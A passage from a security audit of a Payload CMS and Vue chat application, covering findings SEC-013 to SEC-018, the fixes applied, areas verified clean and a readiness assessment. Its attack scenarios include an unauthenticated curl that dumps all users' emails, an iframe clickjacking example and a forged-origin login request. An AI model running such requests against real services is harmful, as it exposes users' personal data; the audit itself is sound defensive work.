- `vue-frontend/default.conf` is now a TLS-terminating vhost (HTTP→HTTPS redirect, `ssl_certificate`/`ssl_certificate_key`, TLSv1.2+, `server_tokens off`, `client_max_body_size 2m`), with the security headers from SEC-014 and no hardcoded IP in the CSP.

**Verification:** `docker compose config` shows MongoDB reachable only on the private network with auth required; `npm ci` is the build command. The live checks (image-layer inspection, external port scan, `docker ps` health, TLS headers) require a Docker daemon and the target VPS and are not verified in this environment.

---

### [SEC-013] Unauthenticated enumeration of all registered users (email disclosure)

- **Severity:** Medium
- **Confidence:** High
- **Status:** **Remediated** (2026-10-30). See [Remediation applied](#remediation-applied-sec-013) at the end of this section. A residual (authenticated users can still discover usernames through a targeted search) is recorded there as an accepted risk.
- **Affected component:** `penggunas` collection — read access
- **Affected file and line:** `payload-be/src/collections/Penggunas.ts:11` (`read: () => true`); `vue-frontend/src/components/Dashboard.vue:154-158`
- **CWE / advisory:** CWE-200 (Exposure of Sensitive Information), CWE-203 (Observable Discrepancy)
- **Prerequisites:** Network access. **No authentication.**
- **Technical explanation:** `Penggunas.access.read = () => true` means `GET /api/penggunas` returns every account document, including `email`, `username`, `id`, `createdAt` and `updatedAt`. The `hash`/`salt` fields are `hidden: true` so they are stripped from the response — but every other field is returned. `Dashboard.vue:154` then filters the list client-side (`otherUsers.value = data.docs.filter(u => u.id !== user_id.value)`), proving the server-side list was unfiltered. This is the enumeration primitive referenced by SEC-001 (target ids), SEC-007 (target emails for lockout) and SEC-010.
- **Attack scenario:**
  1. `curl https://api.example.com/api/penggunas` → a JSON array containing every registered user's id, email and username.
  2. The attacker uses the list to build a targeted password-takeover list (SEC-001) or a lockout list (SEC-007), or harvests emails for spam/phishing.
- **Impact:** Disclosure of every registered user's email address and internal document id; enables targeted attacks against SEC-001 and SEC-007; undermines any user privacy expectation.
- **Evidence:**
  - `payload-be/src/collections/Penggunas.ts:9-13` — `read: () => true`.
  - `vue-frontend/src/components/Dashboard.vue:154-158` — `const res = await fetch(.../api/penggunas, { credentials: 'include' }); const data = await res.json(); otherUsers.value = data.docs.filter(u => u.id !== user_id.value)`.
  - `vue-frontend/src/components/Browse.vue:29-40` — a second, redundant user-list consumer.
  - Payload's `hidden: true` on `hash`/`salt` removes them from output but leaves `email` and `username` exposed.
- **Recommended remediation:**
  1. Set `Penggunas.access.read` to `({ req: { user } }) => Boolean(user)` (or scope it to a directory of opted-in users).
  2. Add **field-level** access control so that `email` is only readable by the account owner and administrators:
     ```ts
     {
       name: 'email',
       type: 'email',
       access: {
         read: ({ req: { user } }) =>
           Boolean(user) && (user.collection === 'users' || user.id === req.user.id),
       },
     }
     ```
  3. If the user directory must be visible to signed-in users, expose a dedicated, minimal projection (id + display name only) rather than the whole document.
- **Verification procedure:**
  1. Anonymous `GET /api/penggunas` → expect **401/403**.
  2. As user A, `GET /api/penggunas` → expect the list, but each document must **not** contain another user's `email`. *(Criterion updated 2026-10-30.)*
  3. As user A, `GET /api/penggunas/<B_id>` → expect **200** with `{ id, username }` and **no** `email`. *(Criterion updated 2026-10-30: authenticated reads of another user's non-sensitive profile fields are permitted; only the email address is withheld.)*
  4. As user A, `GET /api/penggunas/directory` with no `q`, or `q` shorter than 2 characters → expect **400**.
- **Deployment impact:** Fix with SEC-002/SEC-003 (same access-control change set).
- **Dependencies / migration concerns:** None.

---

#### Remediation applied (SEC-013)

**Remediated (2026-10-30).** Anonymous enumeration is closed, email addresses are never disclosed, and the directory is no longer usable as a bulk user-list. Usernames themselves remain discoverable by authenticated users through a targeted search; that residual is recorded below as an accepted risk.

- `Penggunas.access.read` is no longer `() => true`. It now requires an authenticated session, so an anonymous caller cannot list the collection at all.
- The `email` field carries a field-level `access.read` rule (`penggunaEmailReadAccess`): a user sees **their own** address, and nobody else's. Payload admins see all addresses. This also covers the *populated* path — a `channels.owner` or `messages.Sender` relationship is read through the same rule, so a populated document does not leak the address either, and the list-read path (`GET /api/penggunas`) is covered by the same rule.
- The **sanitized directory endpoint**, `GET /api/penggunas/directory` (`payload-be/src/endpoints/directory.ts`), returns `{ id, username }` only and never includes an email address.
- **The directory is search-based (2026-10-30).** It now **requires** a `q` search term of at least **2** characters and is paginated (`limit` default 25, hard maximum 50; `page` bounded). A blank or one-character term returns **400**. This removes the ability to dump the whole user list in a single request. `parseDirectoryQuery()` is exported and unit-tested.
- **Edge rate limiting.** `vue-frontend/default.conf` adds a dedicated `limit_req_zone` (`api_directory`, 20 r/m per IP) applied to `location = /api/penggunas/directory`, so even a search term cannot be used to enumerate at speed.
- **The Vue SPA was switched to the search contract.** `Dashboard.vue` and `Browse.vue` now issue a debounced search request (`q` + `limit`) instead of listing every user, and the dashboard's user cards never display an email address.

**Verification:** `tests/int/authz.directory.spec.ts` — anonymous request rejected; missing/short `q` rejected with 400; results contain exactly `{ id, username }` and no email; the search term filters and excludes non-matches; `parseDirectoryQuery` bounds/clamps `page`/`limit`. `tests/int/authz.pengguna-collection.spec.ts` — a list read hides other users' email addresses while showing the caller their own. The suite is **73 `it` blocks / 79 test cases across 8 files**, all green; `tsc --noEmit` clean; both applications build.

**Residual — accepted risk (2026-10-30).** Authenticated users can still discover usernames by issuing targeted searches (each of which returns at most 50 entries and is rate-limited). Full removal would require contact-scoped visibility (only expose users you already share a channel or DM with), which the product owner has declined because the chat UI must let a user start a conversation with any registered account. **Signed off by the product owner on 2026-10-30.** Email addresses are never exposed by any path.


**Verification:** `tests/int/authz.pengguna-collection.spec.ts` — "hides another user's email address from an authenticated reader" and "shows a user their own email address"; `tests/int/authz.anonymous.spec.ts` — "hides another user's email address when a relationship is populated"; `tests/int/authz.directory.spec.ts` — the directory contains no email addresses and rejects anonymous requests.

**Remaining:** usernames are still enumerable by any authenticated user. This is a deliberate product trade-off (the alternative breaks message attribution) and should be confirmed with the product owner.

---

### [SEC-014] Missing browser security headers and incomplete CSRF posture

- **Severity:** Medium
- **Confidence:** High
- **Status:** **Remediated** (2026-10-30). See [Remediation applied](#remediation-applied-sec-014) at the end of this section.
- **Affected component:** Frontend nginx vhost; Payload CORS/CSRF configuration
- **Affected file and line:** `vue-frontend/default.conf:1-19`; `payload-be/src/payload.config.ts:33-37`
- **CWE / advisory:** CWE-1021 (Improper Restriction of Rendered UI Layers), CWE-693 (Protection Mechanism Failure), CWE-352 (CSRF)
- **Prerequisites:** Network access to the frontend.
- **Technical explanation:** The SPA's nginx vhost sets no response headers at all. There is no `Content-Security-Policy` (and therefore no `frame-ancestors`, so the Admin Panel and the app can be framed), no `Strict-Transport-Security`, no `X-Content-Type-Options: nosniff`, no `Referrer-Policy`, and no `Permissions-Policy`. On the backend, `csrf` is set to the same three hardcoded origins as `cors` (SEC-008), and Payload's CSRF check is origin-based rather than token-based for cookie-authenticated mutations. The combination of `SameSite=Lax` cookies and origin-based CSRF is adequate against basic cross-site POSTs, but it is not defence in depth, and the GHSA-p6mr-xf3r-ghq4 CSRF-bypass advisory (Payload < 3.79.1) applies directly.
- **Attack scenario:**
  1. The site is framed by an attacker page (`<iframe src="https://app.example.com">`) → clickjacking of the Dashboard's "Send"/"Join" buttons.
  2. A browser MIME-sniffing quirk on a mis-typed static asset serves HTML/JS → content-type confusion.
  3. Absent HSTS, a first-visit SSL-strip or a downgrade redirects the user to HTTP, where the `payload-token` cookie is transmitted in cleartext (the cookie is not `Secure` — SEC-008).
- **Impact:** Clickjacking, MIME-confusion, and downgrade exposure. Individually Low; collectively they are the missing defence-in-depth layer for a public deployment.
- **Evidence:**
  - `vue-frontend/default.conf` — the full 19-line file contains no `add_header` directive.
  - `payload-be/src/payload.config.ts:33-37` — `csrf` list contains only the hardcoded HTTP origins; `serverURL` is absent so the real production origin is never added (Payload 3.70.0 `config/sanitize.js`: `if (config.serverURL !== '') { config.csrf.push(config.serverURL) }`).
  - `payload-be/src/collections/Penggunas.ts:5`, `Users.ts:8` — `auth: true` ⇒ `cookies.sameSite = 'Lax'`, `cookies.secure = false` (Payload `authDefaults`).
  - OSV: GHSA-p6mr-xf3r-ghq4 (Payload < 3.79.1), GHSA-w84c-53h3-mc2g (untrusted redirect, fixed 3.88.0).
- **Recommended remediation:**
  1. Add security headers to the nginx vhost:
     ```nginx
     add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
     add_header X-Content-Type-Options "nosniff" always;
     add_header X-Frame-Options "DENY" always;
     add_header Referrer-Policy "strict-origin-when-cross-origin" always;
     add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
     add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; img-src 'self' data: blob:; connect-src 'self' https://api.example.com; script-src 'self'; style-src 'self' 'unsafe-inline'" always;
     ```
     (`style-src 'unsafe-inline'` is needed because Vue SFCs use scoped styles injected at runtime; tighten if a nonce-based approach is adopted.)
  2. Set `serverURL` so Payload adds the production origin to its CSRF list, and set `cookies.secure = true`.
  3. Upgrade Payload to ≥ 3.90.0 to obtain the CSRF-bypass fix.
  4. Consider explicitly disabling the GraphQL endpoint if the SPA does not use it (`graphQL.disable: true`).
- **Verification procedure:**
  1. `curl -sI https://app.example.com` → all six headers present.
  2. `curl -sI https://api.example.com/admin` → `frame-ancestors 'none'` (or `X-Frame-Options: DENY`).
  3. `curl -sI -X POST https://api.example.com/api/penggunas/login -H "Origin: https://evil.example" -d '{"email":"a@b.c","password":"x"}'` → expect 403.
  4. Load the app inside an `<iframe>` from another origin → expect the frame to be refused.
- **Deployment impact:** Required for public exposure (Stage A, configuration-only work on the VPS).
- **Dependencies / migration concerns:** The CSP `connect-src` must list the real API origin. If the API is on a separate subdomain, it must be listed explicitly or the SPA's fetches will be blocked.

#### Remediation applied (SEC-014)

- `vue-frontend/default.conf` now emits the full header set on every response: `Strict-Transport-Security` (`max-age=31536000; includeSubDomains`), `Content-Security-Policy` (with `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy`, and `Permissions-Policy`. The `connect-src` lists the API origin by name rather than a hardcoded IP.
- The vhost terminates TLS and redirects HTTP to HTTPS, so HSTS is meaningful.
- `serverURL` is now set from the environment, so Payload appends the production origin to its CSRF allow-list; `cookies.secure` is on (SEC-008).
- GraphQL is disabled (`graphQL.disable: true`), removing a second full API surface (SEC-007 residual).

**Verification:** the headers are present in the vhost configuration and covered by an end-to-end test assertion on the anti-framing control; the live `curl` header checks and the CSRF cross-origin rejection require a running deployment and are not verified in this environment. `style-src 'unsafe-inline'` remains (Vue SFC scoped styles); tightening it is tracked as task C10.

---

### [SEC-015] Frontend has no route guards

- **Severity:** Low
- **Confidence:** High
- **Status:** **Remediated (2026-10-30, task B2).** Confirmed (static) as audited.
- **Affected component:** Vue Router configuration
- **Affected file and line:** `vue-frontend/src/router/index.js:11-70` (no `beforeEach` guard)
- **CWE / advisory:** CWE-284 (Improper Access Control) — client-side only
- **Prerequisites:** None.
- **Technical explanation:** The router defines ten routes and installs **no navigation guard**. Every page — including `/dashboard`, `/chat/:user_id` and `/channel/:id` — is reachable without a session. The components then call the API, which rejects the unauthenticated calls, so the user sees an empty shell rather than a redirect to `/login`. This is *not* the security boundary (the backend is), but it degrades usability and gives a false impression that the routes are protected.
- **Attack scenario:** An unauthenticated visitor navigates to `/dashboard`, sees the app chrome and — because `GET /api/penggunas` returns everything (SEC-013) — a fully populated user grid with no indication that they are unauthenticated.
- **Impact:** Confusing/incorrect UI state; unauthenticated visitors may see data that the backend serves anyway. Low direct impact — the backend must be the control.
- **Evidence:**
  - `vue-frontend/src/router/index.js` — the full router object contains only `history` and `routes`; there is no `beforeEach`.
  - `vue-frontend/src/components/Dashboard.vue:135-146` — `getUser()` calls `/api/penggunas/me` and assigns `data.user.username` with no check that `data.user` is present, so an unauthenticated visit throws a `TypeError` rather than redirecting.
- **Recommended remediation:**
  ```js
  router.beforeEach(async (to) => {
    if (to.meta.public) return true
    try {
      const res = await fetch(`${import.meta.env.VITE_API_URL}/api/penggunas/me`, { credentials: 'include' })
      if (!res.ok) return { name: 'login', query: { redirect: to.fullPath } }
    } catch { return { name: 'login' } }
    return true
  })
  ```
  Mark `/login`, `/register`, `/` and `/about` with `meta: { public: true }`.
- **Verification procedure:**
  1. Logged out → navigate to `/dashboard` → expect a redirect to `/login`.
  2. Logged in → `/dashboard` renders normally.
  3. Log out from the Dashboard → confirm the next navigation lands on `/login`.
- **Deployment impact:** Not a blocker; fixed in Stage B for usability and defence in depth.
- **Remediation applied (B2):** `vue-frontend/src/router/index.js` now installs a global
  `router.beforeEach` that fetches `/api/penggunas/me` and redirects to `/login` for any route
  without `meta: { public: true }`. Public routes are `/`, `/about`, `/login`, `/register`,
  `/forgot-password` and `/reset-password`. `Dashboard.vue` now redirects (rather than throwing a
  `TypeError`) when the session is missing or `data.user` is null.
- **Dependencies / migration concerns:** None.

---

### [SEC-016] Unused dependencies and dead code enlarge the attack surface

- **Severity:** Low
- **Confidence:** High
- **Status:** **Remediated** (2026-10-29). See [Remediation applied](#remediation-applied-sec-016) at the end of this section.
- **Affected component:** `payload-be/package.json`, `vue-frontend/src/components/`
- **Affected file and line:** `payload-be/package.json` (`"dompurify": "^3.3.1"`, `"monaco-editor": "^0.55.1"`, `"yjs"`, `"graphql"`); `vue-frontend/src/components/Browse.vue`, `CreateChannel.vue`, `Channel.vue`, `HelloWorld.vue`, `TheWelcome.vue`, `WelcomeItem.vue`, `vue-frontend/src/stores/counter.js`
- **CWE / advisory:** CWE-1104 (Use of Unmaintained Third-Party Components)
- **Prerequisites:** None.
- **Technical explanation:** `dompurify` is installed as a **production** dependency and carries four advisories (fixed 3.4.0 → 3.4.17), yet it is **never imported anywhere in `src/`** — a repository-wide search for `dompurify`/`DOMPurify` returns zero matches. `monaco-editor` (a large code-editor bundle) is likewise never imported. `yjs` is a transitive requirement of Payload rather than an application need. Each unnecessary production dependency expands the supply-chain surface and the advisory count without providing any capability. On the frontend, several components post **obsolete payload shapes** (`Channel.vue:182-190` sends `pengguna_id`/`channel_id` to `/api/messages`, but the collection now defines `Sender`/`Channel`), and `Browse.vue:29` hardcodes `http://localhost:3000` — dead code that will silently misbehave if it is ever wired up.
- **Attack scenario:** Not directly exploitable. The risk is supply-chain: a compromised or vulnerable transitive package that is not needed at all still runs in the production image and still inflates the CVE count.
- **Impact:** Increased supply-chain and patch burden; misleading "unused import" advisories that distract from real findings; a maintenance trap where dead components look like working features.
- **Evidence:**
  - Repository-wide search for `dompurify`, `DOMPurify`, `monaco`, `sanitize` across `payload-be/src` → **no matches**.
  - `payload-be/package.json` — `dompurify`, `monaco-editor`, `yjs` listed under `dependencies`.
  - OSV: 4 advisories for `dompurify@3.3.1`.
  - `vue-frontend/src/components/Channel.vue:182-190` — body `{ pengguna_id, channel_id, message }` against `/api/messages`.
  - `vue-frontend/src/components/Browse.vue:29` — `fetch("http://localhost:3000/api/penggunas", ...)`.
  - `vue-frontend/src/stores/counter.js` — the Pinia demo store; `vue-frontend/src/main.js` installs Pinia but no component imports the store.
- **Recommended remediation:**
  1. Remove `dompurify`, `monaco-editor` and `yjs` from `payload-be/package.json` dependencies.
  2. Delete the dead frontend components (`Channel.vue`, `CreateChannel.vue`, `Browse.vue`, `HelloWorld.vue`, `TheWelcome.vue`, `WelcomeItem.vue`, `stores/counter.js`) and their routes, or fix them so they are not misleading.
  3. Remove `vue-frontend/src/assets/main_old.css`.
  4. Remove the unused `graphql` dependency from the **frontend** if the SPA does not use GraphQL (the backend still needs it).
- **Verification procedure:**
  1. `npm run build` in both applications still succeeds after removal.
  2. `npm ls dompurify monaco-editor yjs` → empty.
  3. `npm run lint` → no unresolved-import errors.
- **Deployment impact:** Not a blocker; Stage B/C.
- **Dependencies / migration concerns:** None — removal only.

---

#### Remediation applied (SEC-016)

The unused production dependencies were removed from `payload-be/package.json`:

- `dompurify` (^3.3.1) — never imported anywhere in `src/`; carried four advisories.
- `monaco-editor` (^0.55.1) — never imported; a large editor bundle.
- `yjs` (^13.6.29) — a Payload internal requirement, not an application need.

`npm ls dompurify monaco-editor yjs` now returns nothing for these as direct dependencies. The dead frontend components and unused routes are still present and remain tracked under C1.

---

### [SEC-017] No CI/CD, no backup procedure, no monitoring, no health check

- **Severity:** Low
- **Confidence:** High
- **Status:** Partially remediated (2026-10-30) — DB-backed `/api/health`, container healthchecks, and log rotation added; CI (B6) and backups (B5) deferred; off-host log shipping and alerting deferred. VPS-side controls **Not verified**
- **Affected component:** Repository tooling and operational readiness
- **Affected file and line:** Repository root (no `.github/`, no CI config); `payload-be/docker-compose.yml` (no `healthcheck:`); `payload-be/src/app/**` (no health route)
- **CWE / advisory:** CWE-693 (Protection Mechanism Failure), CWE-778 (Insufficient Logging)
- **Prerequisites:** None.
- **Technical explanation:** `git ls-files` returns 95 files with **no** CI/CD workflow, no lint/typecheck/test gate, and no release process — every change is a manual copy to the VPS. There is no health-check endpoint (no `/_health`, no Payload health route) and no `healthcheck:` stanza in the compose file, so an orchestrator cannot tell a hung process from a healthy one. There is no log rotation (`docker-compose.yml:28-29` sets `logging: driver: none` for mongo, discarding its logs) and no log shipping or alerting for either service. There is no backup script, no snapshot policy, and — most importantly — **no documented restore procedure**: a backup that has never been restored is not a backup. There is no rollback path beyond "restore the previous image".
- **Attack scenario:** A failed deploy leaves a broken container that nothing detects; an unnoticed disk fill takes the service down; ransomware or a destructive mistake on the VPS destroys the Mongo volume with no way back.
- **Impact:** Extended outages, silent failures, and irrecoverable data loss. Also means that even after the Stage A fixes, there is no way to know whether the deployed version matches the audited one.
- **Evidence:**
  - `git ls-files` — no `.github/`, `.gitlab-ci.yml`, `Jenkinsfile`, or any YAML workflow file.
  - `payload-be/docker-compose.yml` — no `healthcheck:` on either service; `logging: { driver: none }` for mongo.
  - `payload-be/src/app/` — no health route among the route groups.
  - `payload-be/package.json` — no `test:ci`, no lint-in-build, no `prepare`/`prepublish` script.
- **Recommended remediation:**
  1. Add a `GET /api/health` route (or a Payload custom endpoint) that returns 200 plus a DB round-trip result.
  2. Add `healthcheck:` stanzas to both compose services.
  3. Configure the `json-file` log driver with `max-size`/`max-file` limits, and ship logs off-host.
  4. Write and **execute** a backup script (`mongodump` → encrypted, off-host storage) and **document and rehearse** the restore procedure.
  5. Add a minimal CI workflow that runs `npm ci`, `npm run lint`, `npx tsc --noEmit`, `npm run build` and `npm run test:int` on both applications.
  6. Document the rollback procedure (previous image tag + a documented `mongodump` restore).
- **Verification procedure:**
  1. `curl -s https://api.example.com/api/health` → 200 with a JSON body.
  2. `docker ps` shows both containers `healthy`.
  3. Restore a backup into a scratch database and confirm document counts match the source.
  4. Push a deliberately failing commit and confirm CI blocks it.
- **Deployment impact:** Backups and a rollback plan are **Stage B** items but are needed before real user data accumulates.
- **Dependencies / migration concerns:** None.

#### Partial remediation applied (SEC-017)

Addressed: `docker-compose.yml` now has `healthcheck:` stanzas on both services (probing
`GET /api/health`) and uses the `json-file` log driver with `max-size`/`max-file` rotation
instead of `driver: none`; `src/endpoints/health.ts` adds a DB-backed `GET /api/health`
(B4); the nginx API proxy sets `X-Real-IP`/`X-Forwarded-For` for usable access logs; and the
e2e suite was rewritten off the framework template so it asserts the real application.

Still open: off-host log shipping, alerting (B4, deferred), an automated backup **plus a
rehearsed restore** (B5, deferred), and a CI workflow (B6, out of scope).

---

### [SEC-018] Admin collection has no roles — every administrator sees everything

- **Severity:** Low
- **Confidence:** High
- **Status:** **Remediated** (2026-10-30, including the `roles` field via task B3). See [Remediation applied](#remediation-applied-sec-018) at the end of this section.
- **Affected component:** `users` auth collection
- **Affected file and line:** `payload-be/src/collections/Users.ts:1-13`
- **CWE / advisory:** CWE-269 (Improper Privilege Management), CWE-732 (Incorrect Permission Assignment)
- **Prerequisites:** An admin account.
- **Technical explanation:** `Users` declares `auth: true` with **no fields** and **no access block**. Every operation therefore falls back to `defaultAccess` → `Boolean(req.user)`, which is satisfied by *any* authenticated principal, including an application user from the `penggunas` collection (Payload's `req.user.collection` distinguishes them, but the access functions do not check it). The Admin Panel's own UI gating is driven by the Access Operation, which evaluates the same functions — so the collection list shown to an admin is the same one shown to any authenticated user. There is no `roles` field, so there is no way to express "content moderator" versus "full administrator". The `users` collection is also the collection Payload's Admin Panel authenticates against, and there is no `verify` on it either, so an admin account created without an email round-trip is immediately live.
- **Attack scenario:**
  1. An application user authenticates to the API and calls `GET /api/users` → the entire admin user list, including their email addresses, is returned (their `hash`/`salt` are hidden).
  2. Because SEC-001 permits rewriting any `penggunas` document's password, and because a `penggunas` account that has also been added to `users` is a full admin, the chain "create account → own the admin" is complete once the Admin Panel is reachable.
- **Impact:** Disclosure of the administrator account roster; no separation of duties; a single compromised application account can become an administrator.
- **Evidence:**
  - `payload-be/src/collections/Users.ts:1-13` — `auth: true`, `fields: []`, no `access` object.
  - `payload-be/src/collections/config/defaults.js` — `collection.access = { create: defaultAccess, delete: defaultAccess, read: defaultAccess, unlock: defaultAccess, update: defaultAccess, ...collection.access }`.
  - `payload-be/src/auth/defaultAccess.js` — `Boolean(user)`, with no check of `user.collection`.
  - `payload-be/src/payload.config.ts:22-27` — `admin.user: Users.slug`.
  - `payload-be/src/payload-types.ts:153-172` — the generated `User` interface confirms no `roles` field exists.
- **Recommended remediation:**
  1. Add a `roles` field with `admin` and `user` values to the `users` collection.
  2. Restrict `users` access to the admin collection:
     ```ts
     access: {
       create: () => false,          // provision admins via a script, not the API
       read:   ({ req: { user } }) => user?.collection === 'users',
       update: ({ req: { user } }) => user?.collection === 'users',
       delete: ({ req: { user } }) => user?.collection === 'users' && user.roles === 'admin',
     }
     ```
  3. Set `auth.verify: true` on `users` once an email adapter is configured, so an admin account cannot be used before its owner confirms the address.
  4. Provision the first administrator through a controlled script (Payload `bin` / a seed script) rather than through the public first-register flow.
- **Verification procedure:**
  1. Log in as an application user (`penggunas`); `GET /api/users` → expect **403**.
  2. Log in as an admin; `GET /api/users` → expect 200.
  3. `DELETE /api/users/<id>` as a non-admin admin account → expect 403.
- **Deployment impact:** Not a blocker on its own; fix in Stage B. It becomes a blocker in combination with SEC-001.
- **Dependencies / migration concerns:** Adding a `roles` field to a MongoDB collection is schema-less — no migration required. Existing admin documents need `roles` backfilled (default to `admin` for the current admin).

#### Remediation applied (SEC-018)

The core exposure — an application user reaching the admin collection — is closed:

- `Users` now declares an explicit `access` block where **every** operation requires an admin session (`req.user.collection === 'users'`), via the `isAdmin` helper. An application user (`penggunas`) calling `GET /api/users` is denied. This also closes the "second takeover path" noted under SEC-001.
- The first administrator is provisioned through `scripts/create-first-admin.ts` (reading `ADMIN_EMAIL` / `ADMIN_PASSWORD`) rather than the public first-register flow, and `/admin` returns 404 at the nginx edge.
- Both auth collections set `cookies.secure` / `sameSite: 'Lax'`.

**Verification:** `tests/int/authz.users.spec.ts` — the admin collection denies anonymous and application-user access to every operation and permits an admin.

**Roles field — applied (2026-10-30, task B3).** `Users` now declares a `roles` select field
(`admin` / `user`, default `['user']`). `isAdmin` in `src/access/index.ts` requires the `admin`
role **in addition to** `users` collection membership, so an operator account on the admin
collection is no longer an administrator. `scripts/create-first-admin.ts` provisions
`roles: ['admin']`, and `authz.users.spec.ts` asserts that a `users` account without the `admin`
role is denied.

---

## 7. Verified-clean areas

Recording these explicitly so the remediation work is not padded and so future reviewers know they were checked.

| Area | Result | Evidence |
|---|---|---|
| Secrets in Git history | **Clean.** Only `.env.example` (placeholders) and `test.env` (contains only `NODE_OPTIONS`) were ever committed. `.env` is gitignored. | `git log --all --pretty=format: --name-only` → only `.env.example` and `test.env`; `git log -p --all -S "PAYLOAD_SECRET"` → the placeholder only. |
| Frontend HTML injection sinks | **Clean.** No `v-html`, `innerHTML`, `document.write`, `eval()` or `new Function()` anywhere in `vue-frontend/src`. All message and username rendering uses `{{ }}` interpolation (auto-escaped). | Repository-wide search across `vue-frontend/src` → no matches. |
| Token storage in the browser | **Clean.** No `localStorage` or `sessionStorage` usage. Authentication is entirely cookie-based with `HttpOnly`. | Repository-wide search → no matches. |
| SQL injection | **Not applicable.** MongoDB via the Mongoose adapter; no SQL surface exists. | `payload-be/src/payload.config.ts:46-48` — `mongooseAdapter`. |
| Real-time transport | **Not present.** No WebSocket, Socket.IO or SSE server or client exists; Payload's WebSocket usage in the framework is limited to the dev-mode HMR client (disabled when `NODE_ENV=production`). | Search for `socket`, `websocket`, `EventSource` → no matches; `payload/src/index.js` opens the HMR socket only when `NODE_ENV !== 'production'`. |
| GraphQL as an additional exposure surface | **Not a bypass** — GraphQL applies the same access functions, so it is affected by the same findings but adds no new bypass. **Now disabled entirely** (`graphQL.disable: true`, A9). | Payload wires `/api/graphql` to `GRAPHQL_POST(config)` — the same operation layer. |
| GraphQL introspection / playground in production | **Safe.** `disableIntrospectionInProduction` and `disablePlaygroundInProduction` both default to `true`. | Payload 3.70.0 `config/defaults.js`. |
| Password storage | **Acceptable.** PBKDF2-SHA256 with a random 32-byte salt, 25 000 iterations, constant-time `scmp` comparison. Weakness: iteration count is below current guidance (GHSA-q6mq-ch85-c8mm — see SEC-011). | `payload@3.70.0` `auth/strategies/local/generatePasswordSaltHash.ts` and `auth/strategies/local/authenticate.ts`. |
| Password reset flow | **Not exploitable by injection** in 3.70.0 — but GHSA-hp5w-3hxx-vmwf (< 3.79.1) applied. **Remediated**: Payload was upgraded past the fix, the email adapter is now wired (`src/config/email.ts`, B1), and the reset link is only printed to the console in non-production when SMTP is unset. | `payload.config.ts` `email: buildEmailAdapter()`; `Penggunas.auth.forgotPassword`. |
| Filename handling | **Acceptable.** `sanitize-filename` plus a uniqueness loop; `getSafeFileName` prevents collisions and strips traversal characters. | `payload@3.70.0` `uploads/getSafeFilename.ts`. |
| Upload content sniffing | **Good.** Payload detects the real type with `file-type` (`fileTypeFromBuffer`) rather than trusting the client's `Content-Type`, and blocks a list of dangerous extensions. The gap is that SVG/XML/HTML are not on that list (SEC-004). | `payload@3.70.0` `uploads/generateFileData.ts`, `uploads/checkFileRestrictions.ts`. |
| Path traversal on file serving | **Acceptable.** `getFileHandler` resolves the path with `path.resolve` under the collection's static directory. | `payload@3.70.0` `uploads/endpoints/getFile.ts`. |
| Command injection / SSRF in application code | **None.** No `child_process`, `exec`, `eval`, or outbound HTTP calls in application source. The framework's own SSRF advisories (GHSA-6r7f-q7f5-wpx8 etc.) are reachable only via the upload path (SEC-004). | Search across both `src/` trees. |
| Prototype pollution in application code | **None in application code.** The risk is transitive (mongoose — SEC-011). | Search for `Object.assign`, `merge`, `extend` on user input → none. |
| Debug mode in production | **Not enabled.** `config.debug` is unset; Payload's error handling keeps internal messages server-side. | `payload-be/src/payload.config.ts`. |
| Vite dev server exposure | **Not applicable to production** — the advisories are dev-only, and the production image serves the built `dist/` via nginx. | `vue-frontend/Dockerfile` — build stage then `nginx:alpine`. |
| Root `.gitignore` entry for `docker-compose.yml` | **Intentional and harmless** — it targets the repository root path; `payload-be/docker-compose.yml` is a different path and *is* tracked. | Root `.gitignore` line 1. |
| Two auth collections (`users` vs `penggunas`) | **Not a vulnerability per se**, but a design hazard: two auth collections with different semantics and no role system (SEC-018). | `payload-be/src/collections/Users.ts`, `Penggunas.ts`. |

---

## 8. Consolidated remediation roadmap

See **[`remediation-plan.md`](./remediation-plan.md)** for the full three-stage plan with priorities, effort estimates, dependencies, acceptance criteria and required regression tests.

| Stage | Scope | Findings | Gate | Status (2026-10-30) |
|---|---|---|---|---|
| **A — Before any public exposure** | Fix authorization, identity binding, upload hardening, dependency upgrades, CORS/cookie/TLS configuration, and the deployment artefacts | SEC-001, 002, 003, 004, 005, 006, 007, 008, 009, 010, 012, 013, 014, 018 | Hard gate — no public traffic until closed | **Implemented in the repository**; VPS-only verification outstanding |
| **B — Before or shortly after initial release** | Password-reset lifecycle (verification removed), route guards, admin roles, health check, pagination/polling. *(Backups, CI and off-host log shipping deferred.)* | SEC-010 (lifecycle), 015, 017 (health), 018 (roles), 009 (residual) | Release gate | **Mostly implemented (2026-10-30)**; B5/B6 and B4 shipping deferred |
| **C — Long-term maintenance** | Dead-code removal, dependency pruning, real-time transport, test coverage, documentation | SEC-016 (residual), plus architectural items | Continuous | **Open** |

---

## 9. Production readiness assessment

| Category | Status | Evidence | Outstanding requirement |
|---|---|---|---|
| Application security | **Pass (repository)** | Per-document access control and session-derived identity implemented across all 7 collections; 71 authz tests green | Confirm against a live deployment |
| Authentication | **Pass (repository)** | PBKDF2 + sessions + `HttpOnly`; `secure` on, 8-char minimum, `maxLoginAttempts: 5`; email verification **removed** by decision (B1), reset flow added | Configure SMTP (B1); live header check |
| Authorization | **Pass (repository)** | Every access function is a real predicate; self/participant/member/owner/admin scoping | VPS verification |
| Dependency health | **Pass** | Payload & `@payloadcms/*` 3.92.1, Next 16.4.3, mongoose 8.24.1, sharp 0.35.5, qs 6.17.1; OSV scan clean | Re-scan on future bumps |
| Configuration & secrets | **Pass (repository)** | Environment-driven CORS/CSRF, `serverURL` set, mandatory non-empty secret via `requireEnv()` | Rotate `PAYLOAD_SECRET` on the VPS |
| HTTPS & reverse proxy | **Pass (repository)** | TLS-terminating vhost, HTTP→HTTPS redirect, full header set | Valid certificate + live header check on the VPS |
| Database & storage security | **Pass (repository)** | No published 27017, MongoDB auth enabled, `.dockerignore` added | External port scan on the VPS |
| Real-time communication | **Not applicable** | No WebSocket/SSE layer exists; polling only | — |
| Availability & resource controls | **Pass (repository)** | Edge rate limits, 5 MB upload cap, `defaultMaxTextLength`, message length bounded; client polling backoff + visibility pause (B7) | Live 429 check |
| Logging & monitoring | **Partial** | Log rotation, healthchecks and a DB-backed `/api/health` endpoint added (B4) | Off-host log shipping and alerting (deferred) |
